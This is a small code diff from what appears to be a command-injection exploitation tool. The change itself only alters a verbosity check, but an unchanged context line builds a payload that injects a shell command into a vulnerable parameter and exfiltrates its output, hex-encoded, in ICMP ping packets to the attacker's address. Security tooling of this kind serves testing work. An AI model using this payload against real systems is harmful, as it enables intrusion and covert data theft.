@@ -101,7 +101,7 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   payload = ("; " + cmd + " | xxd -p -c" + str(exfiltration_length) + " | while read line; do ping -p $line -c1 -s" + str(exfiltration_length * 2) + " -q " + ip_src + "; done")
   
   # Check if defined "--verbose" option.
-  if settings.VERBOSITY_LEVEL >= 1:
+  if settings.VERBOSITY_LEVEL != 0:
     debug_msg = "Executing the '" + cmd + "' command. "
     sys.stdout.write(settings.print_debug_msg(debug_msg))
     sys.stdout.flush()
